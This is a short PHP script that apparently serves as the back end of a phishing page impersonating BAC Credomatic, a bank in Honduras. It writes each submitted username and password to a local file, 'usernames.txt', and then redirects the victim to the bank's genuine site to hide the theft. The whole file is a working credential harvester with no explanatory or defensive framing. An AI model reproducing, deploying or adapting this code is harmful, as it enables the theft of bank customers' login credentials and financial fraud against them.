<?php

file_put_contents("usernames.txt", "Username: " . $_POST['user'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.baccredomatic.com/es-hn');
exit();
?>